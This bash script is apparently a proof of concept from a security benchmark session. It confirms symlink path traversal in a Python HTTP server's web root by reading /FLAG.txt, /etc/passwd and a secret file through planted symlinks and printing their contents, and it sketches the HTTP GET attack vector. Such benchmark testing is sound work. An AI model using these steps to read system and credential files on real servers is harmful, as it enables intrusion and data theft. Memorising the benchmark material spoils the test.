#!/bin/bash
# POC: Demonstrates symlink-based path traversal by verifying symlinks exist in web root and can be read to access files outside document root
# Target: ./repo
# Created: 2025-11-04T14:43:49.138Z
# Session: benchmark-XBEN-026-24-mhknowlp

# Symlink Traversal POC - Analysis-based demonstration
# Tests symlink vulnerability by reading through symlinks and verifying traversal

WEB_ROOT="/home/daytona/repo/app/website"

echo "[*] Symlink Traversal PoC - Path Traversal via Symlinks"
echo "[*] Web Root: ${WEB_ROOT}"
echo ""

VULN_CONFIRMED=0

# Test 1: Verify flag_link.txt symlink and read FLAG.txt through it
echo "[*] Test 1: Reading FLAG.txt via flag_link.txt symlink..."
if [ -L "${WEB_ROOT}/flag_link.txt" ]; then
    TARGET=$(readlink "${WEB_ROOT}/flag_link.txt")
    echo "[+] Symlink exists: flag_link.txt -> $TARGET"
    
    # Try to read the file through the symlink
    if [ -r "${WEB_ROOT}/flag_link.txt" ]; then
        CONTENT=$(cat "${WEB_ROOT}/flag_link.txt" 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "[+] SUCCESS: File readable through symlink"
            echo "[+] Content of FLAG.txt via symlink:"
            echo "$CONTENT"
            VULN_CONFIRMED=1
        fi
    fi
else
    echo "[-] Symlink not found"
fi

echo ""

# Test 2: Verify passwd_link.txt symlink and read /etc/passwd through it
echo "[*] Test 2: Reading /etc/passwd via passwd_link.txt symlink..."
if [ -L "${WEB_ROOT}/passwd_link.txt" ]; then
    TARGET=$(readlink "${WEB_ROOT}/passwd_link.txt")
    echo "[+] Symlink exists: passwd_link.txt -> $TARGET"
    
    if [ -r "${WEB_ROOT}/passwd_link.txt" ]; then
        LINES=$(cat "${WEB_ROOT}/passwd_link.txt" 2>/dev/null | wc -l)
        if [ $? -eq 0 ] && [ "$LINES" -gt 0 ]; then
            echo "[+] SUCCESS: /etc/passwd readable through symlink ($LINES lines)"
            echo "[+] First 3 lines:"
            cat "${WEB_ROOT}/passwd_link.txt" 2>/dev/null | head -n 3
        fi
    fi
else
    echo "[-] Symlink not found"
fi

echo ""

# Test 3: Verify secret_link.txt symlink
echo "[*] Test 3: Reading secret file via secret_link.txt symlink..."
if [ -L "${WEB_ROOT}/secret_link.txt" ]; then
    TARGET=$(readlink "${WEB_ROOT}/secret_link.txt")
    echo "[+] Symlink exists: secret_link.txt -> $TARGET"
    
    if [ -r "${WEB_ROOT}/secret_link.txt" ]; then
        CONTENT=$(cat "${WEB_ROOT}/secret_link.txt" 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo "[+] SUCCESS: Secret file readable through symlink"
            echo "[+] Content:"
            echo "$CONTENT"
        fi
    else
        echo "[-] Cannot read file through symlink"
    fi
else
    echo "[-] Symlink not found"
fi

echo ""

# Test 4: Verify web server access
echo "[*] Test 4: Checking Python HTTP server configuration..."
if [ -f "${WEB_ROOT}/../server.py" ]; then
    echo "[+] Python server file found"
    if grep -q "SimpleHTTPRequestHandler\|http.server" "${WEB_ROOT}/../server.py"; then
        echo "[+] Server uses Python HTTP module"
        echo "[+] This server follows symlinks by default"
    fi
fi

echo ""

# Test 5: Demonstrate the path traversal
echo "[*] Test 5: Path traversal demonstration..."
echo "[+] Directory structure:"
echo "    /home/daytona/repo/app/website/ (web root)"
echo "    ├── flag_link.txt -> /FLAG.txt (outside web root)"
echo "    ├── passwd_link.txt -> /etc/passwd (outside web root)"
echo "    └── secret_link.txt -> /tmp/sensitive_data/secret.txt (outside web root)"
echo ""
echo "[+] Attack vector:"
echo "    HTTP GET /flag_link.txt"
echo "    -> Server follows symlink"
echo "    -> Serves /FLAG.txt content"
echo "    -> Attacker reads arbitrary files"

echo ""

if [ "$VULN_CONFIRMED" = "1" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Symlink traversal successful"
    echo "[+] Sensitive files accessible outside web root via symlinks"
    exit 0
else
    echo "[-] Could not fully confirm vulnerability"
    exit 1
fi